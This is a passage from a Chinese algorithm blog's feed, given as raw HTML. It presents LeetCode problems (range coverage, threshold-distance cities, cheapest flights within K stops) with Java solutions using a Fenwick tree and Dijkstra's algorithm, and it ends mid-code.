<span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> query(right + <span class="number">1</span>) - query(left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your NumArray object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * NumArray obj = new NumArray(nums);</span></span><br><span class="line"><span class="comment"> * obj.update(index,val);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.sumRange(left,right);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="1893-检查是否区域内所有整数都被覆盖（简单）"><a href="#1893-检查是否区域内所有整数都被覆盖（简单）" class="headerlink" title="1893.检查是否区域内所有整数都被覆盖（简单）"></a>1893.检查是否区域内所有整数都被覆盖（简单）</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/check-if-all-the-integers-in-a-range-are-covered/description/">1893. 检查是否区域内所有整数都被覆盖</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个二维整数数组&nbsp;<code>ranges</code>&nbsp;和两个整数&nbsp;<code>left</code>&nbsp;和&nbsp;<code>right</code>&nbsp;。每个&nbsp;<code>ranges[i] = [start<sub>i</sub>, end<sub>i</sub>]</code>&nbsp;表示一个从&nbsp;<code>start<sub>i</sub></code>&nbsp;到&nbsp;<code>end<sub>i</sub></code>&nbsp;的&nbsp;<strong>闭区间</strong>&nbsp;。</p><p>如果闭区间&nbsp;<code>[left, right]</code>&nbsp;内每个整数都被&nbsp;<code>ranges</code>&nbsp;中&nbsp;<strong>至少一个</strong>&nbsp;区间覆盖，那么请你返回&nbsp;<code>true</code>&nbsp;，否则返回&nbsp;<code>false</code>&nbsp;。</p><p>已知区间 <code>ranges[i] = [start<sub>i</sub>, end<sub>i</sub>]</code> ，如果整数 <code>x</code> 满足 <code>start<sub>i</sub> &lt;= x &lt;= end<sub>i</sub></code>&nbsp;，那么我们称整数<code>x</code>&nbsp;被覆盖了。</p><p><strong>示例 1：</strong></p><pre><b>输入：</b>ranges = [[1,2],[3,4],[5,6]], left = 2, right = 5<b>输出：</b>true<b>解释：</b>2 到 5 的每个整数都被覆盖了：- 2 被第一个区间覆盖。- 3 和 4 被第二个区间覆盖。- 5 被第三个区间覆盖。</pre><p><strong>示例 2：</strong></p><pre><b>输入：</b>ranges = [[1,10],[10,20]], left = 21, right = 21<b>输出：</b>false<b>解释：</b>21 没有被任何一个区间覆盖。</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= ranges.length &lt;= 50</code></li>    <li><code>1 &lt;= start<sub>i</sub> &lt;= end<sub>i</sub> &lt;= 50</code></li>    <li><code>1 &lt;= left &lt;= right &lt;= 50</code></li></ul></div><ol><li><p>思路</p><blockquote><p>可以把两个整数 left 和 right的区间[left, right]分别拆开看做每个单独的区间[i]，取[i]在ranges区间的值是否不等于0，如果不等于0则说明ranges已覆盖。</p></blockquote></li><li><p>解题方法</p><blockquote><p>套用树状数组，对ranges里的区间range [i…j],都初始化到树状数组中，固定 add 值 1，query查询时，然后判断值是否为0。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>建树的时间复杂度：跟ranges和里面的range长度、lowbit的时间有关，n最大为50，最大的时间复杂度为$O(n<em>n</em>logC)$；查询query的时间复杂度为$O(nlogC)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(C)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 用树状数组解答，查询区间内是否有值</span></span><br><span class="line">    <span class="type">int</span>[] tree;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCovered</span><span class="params">(<span class="type">int</span>[][] ranges, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        len = <span class="number">51</span>;</span><br><span class="line">        tree = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="comment">// 建树</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] range: ranges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">lr</span> <span class="operator">=</span> range[<span class="number">0</span>], rr = range[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">while</span>(lr &lt;= rr) &#123;</span><br><span class="line">                add(lr, <span class="number">1</span>);</span><br><span class="line">                lr++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (query(i) - query(i -<span class="number">1</span>) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; len) &#123;</span><br><span class="line">            tree[index] += <span class="number">1</span>;</span><br><span class="line">            index += lowbit(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += tree[x];</span><br><span class="line">            x -= lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;求解数组区间的和，有前缀和、差分数组、树状数组，但各所适用的场景不用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前缀和适用于数组的值一开始固定不变的情况；&lt;/li&gt;
&lt;li&gt;差分数组适用于数组的值会改变（增加|删除），但是求解原数据时需要恢复数据；&lt;/li&gt;
&lt;li&gt;树状数组适用数组的值会改变，还可以快速求解一段区间的和，但需要构建数据结构。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="树状数组" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
    
  </entry>
  
  <entry>
    <title>dijkstra，解带权重的最短路径问题（图）</title>
    <link href="https://blog.zhengxiangling.com/2023/11/18/dijkstra%EF%BC%8C%E8%A7%A3%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/11/18/dijkstra%EF%BC%8C%E8%A7%A3%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/</id>
    <published>2023-11-18T12:42:00.000Z</published>
    <updated>2023-11-19T05:24:24.121Z</updated>
    
    <content type="html"><![CDATA[<p>题目给出的条件为：图、路径有权值、权重无负数、求路径长度最值，可以使用 dijkstra 求 <em>出发点</em> 到其他点的 <em>最短路径</em>，记住dijkstra算法模板，直接套上用，构建一个 <code>State</code>类记录点的id和记录的最短路径长度，然后核心是最小堆，结合BFS遍历。</p><span id="more"></span><h5 id="1334-阈值距离内邻居最少的城市"><a href="#1334-阈值距离内邻居最少的城市" class="headerlink" title="1334.阈值距离内邻居最少的城市"></a>1334.阈值距离内邻居最少的城市</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance/description/">1334. 阈值距离内邻居最少的城市</a></p></blockquote><details><summary>题目(点击展开)</summary><div class="elfjS" data-track-load="description_content"><p>有 <code>n</code>&nbsp;个城市，按从 <code>0</code> 到 <code>n-1</code>&nbsp;编号。给你一个边数组&nbsp;<code>edges</code>，其中 <code>edges[i] = [from<sub>i</sub>, to<sub>i</sub>, weight<sub>i</sub>]</code>&nbsp;代表&nbsp;<code>from<sub>i</sub></code>&nbsp;和&nbsp;<code>to<sub>i</sub></code><sub>&nbsp;</sub>两个城市之间的双向加权边，距离阈值是一个整数&nbsp;<code>distanceThreshold</code>。</p><p>返回能通过某些路径到达其他城市数目最少、且路径距离 <strong>最大</strong> 为&nbsp;<code>distanceThreshold</code>&nbsp;的城市。如果有多个这样的城市，则返回编号最大的城市。</p><p>注意，连接城市 <em><strong>i</strong></em> 和 <em><strong>j</strong></em> 的路径的距离等于沿该路径的所有边的权重之和。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_01.png" class="lazyload" data-srcset="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 225px; width: 300px;"></p><pre><strong>输入：</strong>n = 4, edges = [[0,1,3],[1,2,1],[1,3,4],[2,3,1]], distanceThreshold = 4<strong>输出：</strong>3<strong>解释：</strong>城市分布图如上。每个城市阈值距离 distanceThreshold = 4 内的邻居城市分别是：城市 0 -&gt; [城市 1, 城市 2]&nbsp;城市 1 -&gt; [城市 0, 城市 2, 城市 3]&nbsp;城市 2 -&gt; [城市 0, 城市 1, 城市 3]&nbsp;城市 3 -&gt; [城市 1, 城市 2]&nbsp;城市 0 和 3 在阈值距离 4 以内都有 2 个邻居城市，但是我们必须返回城市 3，因为它的编号最大。</pre><p><strong>示例 2：</strong></p><p><strong><img alt="" src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_02.png" class="lazyload" data-srcset="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 225px; width: 300px;"></strong></p><pre><strong>输入：</strong>n = 5, edges = [[0,1,2],[0,4,8],[1,2,3],[1,4,2],[2,3,1],[3,4,1]], distanceThreshold = 2<strong>输出：</strong>0<strong>解释：</strong>城市分布图如上。&nbsp;每个城市阈值距离 distanceThreshold = 2 内的邻居城市分别是：城市 0 -&gt; [城市 1]&nbsp;城市 1 -&gt; [城市 0, 城市 4]&nbsp;城市 2 -&gt; [城市 3, 城市 4]&nbsp;城市 3 -&gt; [城市 2, 城市 4]城市 4 -&gt; [城市 1, 城市 2, 城市 3]&nbsp;城市 0 在阈值距离 2 以内只有 1 个邻居城市。</pre><p><strong>提示：</strong></p><ul>    <li><code>2 &lt;= n &lt;= 100</code></li>    <li><code>1 &lt;= edges.length &lt;= n * (n - 1) / 2</code></li>    <li><code>edges[i].length == 3</code></li>    <li><code>0 &lt;= from<sub>i</sub> &lt; to<sub>i</sub> &lt; n</code></li>    <li><code>1 &lt;= weight<sub>i</sub>,&nbsp;distanceThreshold &lt;= 10^4</code></li>    <li>所有 <code>(from<sub>i</sub>, to<sub>i</sub>)</code>&nbsp;都是不同的。</li></ul></div></details><ol><li><p>思路</p><blockquote><p>图，有权值，权重无负数，求路径长度，可以使用dijkstra求出发点到其他点的最短路径。</p></blockquote></li><li><p>解题方法</p><blockquote><p>核心数据结构为求起点到不超过阈值的最短路径，然后遍历所有的点，求最短路径的长度，题目为求最后一个路径长度最短的点，遍历找到即可。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(nlogn)$</p></blockquote></li><li><p>空间复杂度:</p></li></ul></li></ol><blockquote><p>添加空间复杂度, 示例： $O(n+m)$</p></blockquote><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> max;</span><br><span class="line">    <span class="type">boolean</span>[] visited;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTheCity</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] edges, <span class="type">int</span> distanceThreshold)</span> &#123;</span><br><span class="line">        max = distanceThreshold;</span><br><span class="line">        visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt;[] graph = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            graph[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="comment">// 构造图</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> edge[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> edge[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> edge[<span class="number">2</span>];</span><br><span class="line">            graph[from].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;to, w&#125;);</span><br><span class="line">            graph[to].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;from, w&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> -<span class="number">1</span>, cnt = n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="comment">// 对每个点都做dijkstra</span></span><br><span class="line">            <span class="type">int</span>[] dist = dijkstra(i, graph);</span><br><span class="line">            <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i != j &amp;&amp; dist[j] &lt;= max) cur++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cur &lt;= cnt) &#123;</span><br><span class="line">                cnt = cur;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dijkstra(<span class="type">int</span> start, List&lt;<span class="type">int</span>[]&gt;[] graph) &#123;</span><br><span class="line">        <span class="type">int</span>[] dist = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        Arrays.fill(dist, Integer.MAX_VALUE);</span><br><span class="line">        dist[start] = <span class="number">0</span>;</span><br><span class="line">        visited[start] = <span class="literal">true</span>;</span><br><span class="line">        Queue&lt;State&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((a, b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> a.distance - b.distance;</span><br><span class="line">        &#125;);</span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(start, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">State</span> <span class="variable">cur</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">curId</span> <span class="operator">=</span> cur.id;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curDistance</span> <span class="operator">=</span> cur.distance;</span><br><span class="line">            <span class="keyword">if</span> (curDistance &gt; dist[curId] || curDistance &gt; max) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span>[] neighbor: graph[curId]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextId</span> <span class="operator">=</span> neighbor[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextW</span> <span class="operator">=</span> dist[curId] + neighbor[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (dist[nextId] &gt; nextW) &#123;</span><br><span class="line">                    dist[nextId] = nextW;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(nextId, nextW));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> distance;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">State</span><span class="params">(<span class="type">int</span> _id, <span class="type">int</span> _distance)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = _id;</span><br><span class="line">        <span class="built_in">this</span>.distance = _distance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="787-K-站中转内最便宜的航班"><a href="#787-K-站中转内最便宜的航班" class="headerlink" title="787.K 站中转内最便宜的航班"></a>787.K 站中转内最便宜的航班</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/cheapest-flights-within-k-stops/description/">787. K 站中转内最便宜的航班</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>有 <code>n</code> 个城市通过一些航班连接。给你一个数组&nbsp;<code>flights</code> ，其中&nbsp;<code>flights[i] = [from<sub>i</sub>, to<sub>i</sub>, price<sub>i</sub>]</code> ，表示该航班都从城市 <code>from<sub>i</sub></code> 开始，以价格 <code>price<sub>i</sub></code> 抵达 <code>to<sub>i</sub></code>。</p><p>现在给定所有的城市和航班，以及出发城市 <code>src</code> 和目的地 <code>dst</code>，你的任务是找到出一条最多经过 <code>k</code>&nbsp;站中转的路线，使得从 <code>src</code> 到 <code>dst</code> 的 <strong>价格最便宜</strong> ，并返回该价格。 如果不存在这样的路线，则输出 <code>-1</code>。</p><p><strong>示例 1：</strong></p><pre><strong>输入:</strong> n = 3, edges = [[0,1,100],[1,2,100],[0,2,500]]src = 0, dst = 2, k = 1<strong>输出:</strong> 200<strong>解释:</strong> 城市航班图如下<img alt="" src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" class="lazyload" data-srcset="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 180px; width: 246px;">从城市 0 到城市 2 在 1 站中转以内的最便宜价格是 200，如图中红色所示。</pre><p><strong>示例 2：</strong></p><pre><strong>输入:</strong> n = 3, edges = [[0,1,100],[1,2,100],[0,2,500]]src = 0, dst = 2, k = 0<strong>输出:</strong> 500<strong>解释:</strong> 城市航班图如下<img alt="" src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" class="lazyload" data-srcset="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 180px; width: 246px;">从城市 0 到城市 2 在 0 站中转以内的最便宜价格是 500，如图中蓝色所示。</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= n &lt;= 100</code></li>    <li><code>0 &lt;= flights.length &lt;= (n * (n - 1) / 2)</code></li>    <li><code>flights[i].length == 3</code></li>    <li><code>0 &lt;= from<sub>i</sub>, to<sub>i</sub> &lt; n</code></li>    <li><code>from<sub>i</sub> != to<sub>i</sub></code></li>    <li><code>1 &lt;= price<sub>i</sub> &lt;= 10<sup>4</sup></code></li>    <li>航班没有重复，且不存在自环</li>    <li><code>0 &lt;= src, dst, k &lt; n</code></li>    <li><code>src != dst</code></li></ul></div><ol><li><p>思路</p><blockquote><p>图，带权值，没有负值，求起点和终点的最短路径，可以使用dijkstra。</p></blockquote></li><li><p>解题方法</p><blockquote><p>本题的难点在：求中转航班时，可能会出现死胡同而排除掉正确的答案，比如用例<br><code>n=5，flights=[[0,1,5],[1,2,5],[0,3,2],[3,1,2],[1,4,1],[4,2,1]]，src =0，dst=2</code>,如果用默认的dijkstra框架，遇到 <code>curW &gt; dist[curId]</code>就剪枝，会把正确答案给排除掉，比如到终点的路径应该是<code>0-1-4-2</code>得7，而返回的却是<code>0-3-1-2</code>得9，在dist[1]&#x3D;4已经把[0,1,5]这个航班剪掉了，所以我们要用可以中转航班次数来作为剪枝条件，把 <code>curW &gt; dist[curId]</code> 改为 <code>curK &lt; 0</code>，然后如果遇到还有中转次数时，也要把该点入堆。</p></blockquote></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findCheapestPrice</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] flights, <span class="type">int</span> src, <span class="type">int</span> dst, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt;[] graph = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            graph[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] flight: flights) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span>  <span class="operator">=</span> flight[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> flight[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> flight[<span class="number">2</span>];</span><br><span class="line">            graph[from].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;to, w&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dist = dijkstra(graph, src, dst, k);</span><br><span class="line">        <span class="keyword">return</span> dist[dst] != Integer.MAX_VALUE ? dist[dst] : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dijkstra(List&lt;<span class="type">int</span>[]&gt;[] graph, <span class="type">int</span> src, <span class="type">int</span> dst, <span class="type">int</span> k) &#123;</span><br><span class="line">        </span><br><span class="line">        Queue&lt;State&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((a, b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> a.distance - b.distance;</span><br><span class="line">        &#125;);</span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(src, <span class="number">0</span>, k));</span><br><span class="line">        <span class="type">int</span>[] dist = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        <span class="type">int</span>[] stop = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        Arrays.fill(dist, Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">State</span> <span class="variable">cur</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">curId</span> <span class="operator">=</span> cur.id;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curW</span> <span class="operator">=</span> cur.distance;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curK</span> <span class="operator">=</span> cur.k;</span><br><span class="line">            <span class="comment">// System.out.println(curId + &quot;,&quot; + curW + &quot;,&quot; + curDeep);</span></span><br><span class="line">            <span class="keyword">if</span> (curId == dst) &#123;</span><br><span class="line">                <span class="keyword">return</span> dist;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curK &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span>[] neighbor: graph[curId]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextId</span> <span class="operator">=</span> neighbor[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextW</span> <span class="operator">=</span> curW + neighbor[<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextK</span> <span class="operator">=</span> curK - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (dist[nextId] &gt; nextW) &#123;</span><br><span class="line">                    dist[nextId] = nextW;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title 